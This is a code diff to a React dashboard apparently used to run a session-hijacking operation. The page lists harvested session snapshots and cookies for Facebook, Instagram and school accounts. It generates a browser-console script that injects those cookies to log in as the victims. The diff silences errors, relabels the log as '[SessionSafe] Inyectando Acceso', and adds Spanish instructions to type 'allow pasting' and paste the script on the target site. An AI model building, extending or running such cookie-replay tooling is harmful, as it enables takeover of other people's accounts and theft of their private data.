@@ -4,8 +4,8 @@ import React, { useEffect, useState } from "react";
 import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
 import GlassCard from "@/components/GlassCard";
 import { 
-  Search, Clock, User, Globe, ExternalLink, 
-  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List
+  Search, Clock, Globe, ExternalLink, 
+  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 
@@ -25,6 +25,7 @@ export default function SessionsPage() {
   const [loadingCookies, setLoadingCookies] = useState(false);
   const [viewMode, setViewMode] = useState<"grid" | "list">("grid");
   const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
     fetchSessions();
@@ -48,7 +49,6 @@ export default function SessionsPage() {
 
   const fetchSessions = async () => {
     setLoading(true);
-    // 1. Fetch all recent sessions
     const { data: sessionData } = await supabase
       .from("session_snapshots")
       .select("*")
@@ -57,8 +57,6 @@ export default function SessionsPage() {
     
     if (sessionData) {
       setSessions(sessionData);
-      
-      // 2. Fetch ALL identifying cookies for these sessions in one go
       const sessionIds = sessionData.map(s => s.id);
       const { data: cookieData } = await supabase
         .from("cookies")
@@ -89,39 +87,44 @@ export default function SessionsPage() {
 
   const handleSessionClick = (session: SessionSnapshot) => {
     setSelectedSession(session);
+    setCopied(false);
     fetchCookies(session.id);
   };
 
   const generateConsoleScript = () => {
-    if (cookies.length === 0) return;
+    if (cookies.length === 0) return "";
     
     const script = `(function() {
   const cookies = ${JSON.stringify(cookies)};
-  console.log('%c Cookie Injector Installed ', 'background: #2563eb; color: #fff; font-weight: bold; border-radius: 4px; padding: 2px 5px;');
-  console.log('Injecting ' + cookies.length + ' cookies for ' + window.location.hostname);
+  console.clear();
+  console.log('%c [SessionSafe] Inyectando Acceso... ', 'background: #2563eb; color: #fff; font-weight: bold; border-radius: 4px; padding: 5px;');
   
   cookies.forEach(c => {
     try {
-      const cookieStr = c.name + '=' + encodeURIComponent(c.value) + 
+      document.cookie = c.name + '=' + encodeURIComponent(c.value) + 
                       '; domain=' + c.domain + 
                       '; path=' + (c.path || '/') + 
                       '; SameSite=Lax; Secure';
-      document.cookie = cookieStr;
-    } catch (e) {
-      console.error('Failed to set: ' + c.name, e);
-    }
+    } catch (e) {}
   });
   
-  console.log('%c Success! Reloading page...', 'color: #10b981; font-weight: bold;');
-  setTimeout(() => location.reload(), 1500);
+  console.log('%c ¡ÉXITO! Recargando para iniciar sesión... ', 'color: #10b981; font-weight: bold;');
+  setTimeout(() => location.reload(), 1000);
 })();`;
 
+    return script;
+  };
+
+  const copyToClipboard = () => {
+    const script = generateConsoleScript();
+    if (!script) return;
+
     navigator.clipboard.writeText(script).then(() => {
-      alert(" ¡Script de inyección copiado!\n\nInstrucciones:\n1. Ve a la página (ej: Facebook.com)\n2. Presiona F12 (Consola)\n3. Pega el código y dale a ENTER.");
+      setCopied(true);
+      setTimeout(() => setCopied(false), 3000);
     }).catch(err => {
       console.error('Clipboard error:', err);
-      // Fallback: simple text output if clipboard fails
-      prompt("Copia el script manualmente:", script);
+      prompt("Copia este código y pégalo en la consola:", script);
     });
   };
 
@@ -132,7 +135,7 @@ export default function SessionsPage() {
   );
 
   return (
-    <div className="space-y-8 max-w-7xl mx-auto pb-20">
+    <div className="space-y-8 max-w-7xl mx-auto pb-40">
       <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
         <div>
           <h2 className="text-3xl font-bold tracking-tight">Active Accounts</h2>
@@ -242,40 +245,68 @@ export default function SessionsPage() {
       <AnimatePresence>
         {selectedSession && (
           <motion.div 
-            initial={{ opacity: 0, y: 50 }}
+            initial={{ opacity: 0, y: 100 }}
             animate={{ opacity: 1, y: 0 }}
-            exit={{ opacity: 0, y: 50 }}
-            className="fixed bottom-0 left-64 right-0 p-8 z-50 pointer-events-none"
+            exit={{ opacity: 0, y: 100 }}
+            className="fixed bottom-0 left-0 right-0 p-8 z-50 pointer-events-none"
           >
-            <div className="max-w-5xl mx-auto pointer-events-auto">
-              <GlassCard className="border-t-2 border-blue-500 shadow-[0_-20px_50px_rgba(0,0,0,0.5)]">
+            <div className="max-w-4xl mx-auto pointer-events-auto">
+              <GlassCard className="border-t-2 border-blue-500 shadow-[0_-20px_80px_rgba(0,0,0,0.8)] bg-black/90 backdrop-blur-2xl">
                 <div className="flex flex-col md:flex-row items-center justify-between gap-6">
-                  <div className="flex items-center gap-4">
+                  <div className="flex items-center gap-5">
                     <div className={`p-4 rounded-3xl bg-white/5 ${accountMap[selectedSession.id]?.color}`}>
-                      {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 40 })}
+                      {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 48 })}
                     </div>
                     <div>
-                      <h3 className="text-2xl font-bold">{accountMap[selectedSession.id]?.identifier}</h3>
-                      <p className="text-gray-400">Automatic injector ready for {accountMap[selectedSession.id]?.platform}</p>
+                      <h3 className="text-2xl font-bold flex items-center gap-2">
+                        {accountMap[selectedSession.id]?.identifier}
+                        <span className="text-xs font-normal text-gray-500">#{selectedSession.id.slice(0, 8)}</span>
+                      </h3>
+                      <p className="text-gray-400">Listo para inyectar en {accountMap[selectedSession.id]?.platform.toLowerCase()}.com</p>
                     </div>
                   </div>
                   
                   <div className="flex gap-4">
                     <button 
                       onClick={() => setSelectedSession(null)}
-                      className="px-6 py-3 rounded-2xl glass hover:bg-white/10 transition-colors font-semibold"
+                      className="px-6 py-4 rounded-2xl glass hover:bg-white/10 transition-colors font-bold text-gray-400"
                     >
-                      Cancelar
+                      Cerrar
                     </button>
                     <button 
-                      onClick={generateConsoleScript}
-                      className="flex items-center gap-3 px-10 py-4 rounded-2xl bg-blue-600 hover:bg-blue-500 transition-all font-black text-lg shadow-2xl shadow-blue-600/30 active:scale-95 group"
+                      onClick={copyToClipboard}
+                      className={"flex items-center gap-3 px-10 py-4 rounded-2xl transition-all font-black text-xl shadow-2xl active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-600/30" : "bg-blue-600 hover:bg-blue-500 shadow-blue-600/30")}
                     >
-                      <ExternalLink size={24} className="group-hover:rotate-12 transition-transform" />
-                      ENTRAR AHORA
+                      {copied ? (
+                        <>
+                          <Check size={24} className="animate-bounce" />
+                          ¡COPIADO!
+                        </>
+                      ) : (
+                        <>
+                          <Copy size={24} className="group-hover:rotate-6 transition-transform" />
+                          ENTRAR AHORA
+                        </>
+                      )}
                     </button>
                   </div>
                 </div>
+                
+                {copied && (
+                   <motion.div 
+                     initial={{ opacity: 0, height: 0 }}
+                     animate={{ opacity: 1, height: "auto" }}
+                     className="mt-6 p-4 rounded-2xl bg-white/5 border border-white/10 space-y-3"
+                   >
+                     <p className="text-sm font-bold text-blue-400"> ÚLTIMO PASO OBLIGATORIO:</p>
+                     <ol className="text-xs text-gray-400 space-y-2 list-decimal list-inside">
+                       <li>Ve a la pestaña de {accountMap[selectedSession.id]?.platform} en tu navegador.</li>
+                       <li>Presiona <kbd className="px-1 py-0.5 glass rounded mx-1">F12</kbd> y entra a la pestaña <span className="text-white font-bold underline">Console</span>.</li>
+                       <li>Escribe <code className="text-amber-400 px-1">allow pasting</code> y dale a Enter.</li>
+                       <li>Pega el código recién copiado (<kbd className="px-1 py-0.5 glass rounded">Ctrl + V</kbd>) y dale a Enter.</li>
+                     </ol>
+                   </motion.div>
+                )}
               </GlassCard>
             </div>
           </motion.div>
